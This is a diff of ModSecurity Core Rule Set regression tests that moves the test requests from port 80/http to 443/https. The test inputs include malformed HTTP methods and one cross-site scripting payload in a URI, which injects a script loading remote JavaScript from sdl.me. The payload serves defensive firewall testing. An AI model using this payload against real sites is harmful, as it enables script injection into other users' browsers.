@@ -14,11 +14,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "GET"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "/"
               version: "HTTP/1.1"
             output: 
@@ -33,11 +33,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "     GET"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "/"
               version: "HTTP/1.1"
             output: 
@@ -51,11 +51,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "OPTIONS"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "*"
               version: "HTTP/1.1"
             output: 
@@ -69,11 +69,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "CONNECT"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "1.2.3.4:80"
               version: "HTTP/1.1"
             output: 
@@ -87,11 +87,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "CONNECT"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "www.cnn.com"
               version: "HTTP/1.1"
             output: 
@@ -105,11 +105,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "CONNECT"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests #FP"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "www.cnn.com:80"
               version: "HTTP/1.1"
             output: 
@@ -123,11 +123,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "GET"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "/index.html?I=Like&Apples=Today#tag"
               version: "HTTP/1.1"
             output: 
@@ -142,11 +142,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "GET"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "/index.html:80?I=Like&Apples=Today#tag"
               version: "HTTP/1.1"
             output: 
@@ -160,11 +160,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "OPTIONS"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "/"
               version: "HTTP/1.1"
             output: 
@@ -178,11 +178,11 @@
             input:
               dest_addr: "127.0.0.1"
               method: "REALLYLONGUNREALMETHOD"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests # FN"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "/"
               version: "HTTP/1.1"
             output: 
@@ -195,11 +195,11 @@
           stage: 
             input:
               dest_addr: "127.0.0.1"
-              port: 80
+              port: 443
               headers:
                   User-Agent: "ModSecurity CRS 3 Tests # FN"              
                   Host: "localhost"
-              protocol: "http"
+              protocol: "https"
               uri: "\\"
               version: "HTTP/1.1"
             output: 
@@ -219,7 +219,7 @@
               Proxy-Connection: keep-alive
               User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
             method: "\tGET"
-            port: 80
+            port: 443
             uri: /
             version: HTTP/1.1
           output:
@@ -239,7 +239,7 @@
               Proxy-Connection: keep-alive
               User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
             method: GET
-            port: 80
+            port: 443
             uri: \index.html
             version: HTTP\1.0
           output:
@@ -259,7 +259,7 @@
               Proxy-Connection: keep-alive
               User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
             method: '|GET'
-            port: 80
+            port: 443
             uri: /
             version: HTTP/1.0
           output:
@@ -273,7 +273,7 @@
           input:
             dest_addr: 127.0.0.1
             method: GET
-            port: 80
+            port: 443
             uri: '/demo/xss/xml/vuln.xml.php?input=<script xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location=\"javascript:(function () {var x = document.createElement(\\\"script\\\");x.src = \\\"//sdl.me/popup.js?//\\\";document.childNodes\[0\].appendChild(x);}());\"",1000)</script>&//'
             headers:
               User-Agent: ModSecurity CRS 3 Tests
